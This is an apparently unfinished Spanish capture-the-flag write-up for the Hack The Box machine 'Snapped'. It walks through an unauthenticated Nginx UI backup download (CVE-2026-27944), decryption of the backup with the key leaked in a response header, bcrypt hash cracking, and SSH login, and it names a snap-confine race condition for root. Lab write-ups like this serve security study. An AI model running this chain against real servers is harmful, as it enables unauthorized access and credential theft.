---
created: 2026-6-22
description: Snapped es una máquina Linux difícil que ejecuta Nginx UI, vulnerable a CVE-2026-27944, lo que permite la descarga no autenticada de backups. El backup expone una clave de cifrado AES-256 y un IV, lo que permite descifrar la base de datos y crackear un hash de contraseña bcrypt para obtener acceso SSH como jonathan. La escalada de privilegios implica explotar una condición de carrera TOCTOU en snap-confine y systemd-tmpfiles (CVE-2026-3888).
---

#in-progress #hard #linux #web #htb #subdomains #nginx-ui #cve-2026-27944 #backup #decryption #sqlite #bcrypt  #cve-2026-3888 #toctou #race-condition
# Enumeración
## Nmap

Puertos abiertos: 22,80
```bash
[hvidal@fedora] ~/d/h/h/m/s/scan
❯ nmap -p 22,80 -sCV -oN portscan.txt 10.129.21.165
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

## Subdominios

```bash
[hvidal@fedora] ~/d/h/h/m/s/scan
❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.snapped.htb" -fw 4 -u http://snapped.htb
admin.snapped.htb            [Status: 200, Size: 950]
```

Añadir el subdominio `admin.snapped.htb` a `/etc/hosts`.
```bash
echo "10.129.21.165 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
```

# Explotación

## Descarga del backup

`admin.snapped.htb` ejecuta **Nginx Ui**, que es vulnerable a la descarga de backups ([CVE-2026-27944](https://github.com/advisories/GHSA-g9w5-qffc-6762)).

Descargar `backup.zip` desde `admin.snapped.htb/api/backup`.
Backup.zip está cifrado, pero la API envía la clave **AES-256** a través de la cabecera `X-Backup-Security`, codificada en **base64** y con el formato `key:iv`.

```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ curl -i -D headers.txt -o backup.zip 'http://admin.snapped.htb/api/backup'
```

>[!Note]
>Con este comando las cabeceras se almacenan en `headers.txt` y el backup se descarga como `backup.zip`

## Descifrado del backup

Descomprimir el backup.
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ unzip backup.zip
```

Exportar la `key` y el `iv` decodificados como variables de entorno.
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ export key=$(echo base64-ecoded_key | base64 -d | xxd -p -c 256)

[hvidal@fedora] ~/d/h/h/m/s/content
❯ export iv=$(echo base64-ecoded_iv | base64 -d | xxd -p -c 256)
```

>[!note]
>La key y el iv se encuentran en `headers.txt`:
>`X-Backup-Security: <base64-encoded_key>:<base64-encoded_iv>`

Descifrar los archivos de `backup.zip`.
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ openssl enc -d -aes-256-cbc -in ngix-ui.zip -out ngix-ui_dec.zip -K "$key" -iv "$iv"
```

## Enumeración de la base de datos

`ngix-ui.zip` contiene `database.db`, que es una base de datos **sqlite**.

```bash
[hvidal@fedora] ~/d/h/h/m/s/c/ngix-ui
❯ sqlite3 database.db
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> select id,name,password from users;
1|admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
2|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

Contiene nombres de usuario y sus hashes en **bcrypt**. Podemos volcarlos a un archivo para crackearlos con `hashcat`.
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

Conectarse al usuario `jonathan` mediante ssh.
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ ssh jonathan@snapped.htb
jonathan@snapped:~$ cat user.txt 
```

# Escalada de privilegios

## Enumeración

 La versión de snap es vulnerable a una condición de carrera TOCTOU entre `snap-confine` y `systemd-tmpfiles`. ([CVE-2026-3888](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE))

```bash
jonathan@snapped:/$ snap --version
snap    2.63.1+24.04
snapd   2.63.1+24.04
```

>[!Note] Condición de carrera TOCTOU
>"Time Of Check to Time Of Use." Es un fallo de concurrencia que ocurre cuando un programa comprueba una condición sobre un recurso y lo utiliza después de un breve intervalo asumiendo que nada ha cambiado.
```